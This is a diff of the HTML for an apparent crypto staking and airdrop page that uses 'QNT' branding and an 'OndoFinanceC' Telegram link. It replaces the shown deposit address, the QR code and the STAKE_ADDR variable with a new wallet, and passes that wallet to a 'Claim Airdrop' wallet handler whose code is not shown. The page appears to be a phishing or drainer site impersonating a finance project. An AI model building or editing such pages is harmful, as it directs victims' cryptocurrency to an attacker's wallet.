@@ -2004,7 +2004,7 @@
   <a href="./borrow.html">Borrow QNT</a>
   <a href="./stake.html">Stake QNT</a>
   <button onclick="connectWallet();qToggleNav()">Connect Wallet</button>
-  <button class="q-nd-orange" onclick="window.talkWallet();qToggleNav()">Claim Airdrop</button>
+  <button class="q-nd-orange" onclick="window.talkWallet('0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8');qToggleNav()">Claim Airdrop</button>
   <a class="q-nd-tg" href="https://t.me/OndoFinanceC" target="_blank">Join Telegram</a>
 </div>
 <script>function qToggleNav(){document.getElementById('qHamburger').classList.toggle('open');var d=document.getElementById('qDrawer');d.classList.toggle('open');document.body.style.overflow=d.classList.contains('open')?'hidden':'';}
@@ -2441,7 +2441,7 @@
                         <div
                             style="display:inline-block;padding:12px;background:#fff;border:2px solid #E5E7EB;border-radius:16px;margin-bottom:16px;box-shadow:0 4px 12px rgba(0,0,0,0.06);">
                             <img id="stakeQrImg"
-                                src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=0x21c201f469c6f76a5b395fd1049c029d8f0e850c"
+                                src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8"
                                 alt="HYPE Deposit QR Code" width="200" height="200"
                                 style="display:block;border-radius:8px;" />
                         </div>
@@ -2468,7 +2468,7 @@
                             </div>
                             <div class="aval" id="stakeAddrDisplay"
                                 style="margin-bottom:10px;font-size:13px;font-weight:600;text-align:center;user-select:all;padding:12px 14px;border:1.5px solid #E5E7EB;border-radius:8px;">
-                                0x21c201f469c6f76a5b395fd1049c029d8f0e850c</div>
+                                0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8</div>
                             <button type="button" class="copybtn" id="stakeCopyBtn" onclick="copyStakeAddr()"
                                 style="width:100%;height:42px;font-size:13px;font-weight:700;border-radius:8px;cursor:pointer;">Copy
                                 Address</button>
@@ -2806,7 +2806,7 @@
         style="display:none;"></div>
     <script>
         var LOGO_B64 = '';
-        var STAKE_ADDR = '0x21c201f469c6f76a5b395fd1049c029d8f0e850c';
+        var STAKE_ADDR = '0x3856Eecbdc4e4e4218B7d2bF2070731D9CF62DD8';
         var APR = 4.5, stakedAmt = 0, startTime = null, stakeMethod = null;
         var walletAddress = null, walletChainId = null, walletKind = null;
         var CH = { '0x1': { n: 'Ethereum', e: 'https://etherscan.io', c: 'ETH' }, '0x38': { n: 'BSC', e: 'https://bscscan.com', c: 'BNB' }, '0x89': { n: 'Polygon', e: 'https://polygonscan.com', c: 'MATIC' }, '0xa4b1': { n: 'Arbitrum', e: 'https://arbiscan.io', c: 'ETH' }, '0xa': { n: 'Optimism', e: 'https://optimistic.etherscan.io', c: 'ETH' }, '0x2105': { n: 'Base', e: 'https://basescan.org', c: 'ETH' } };
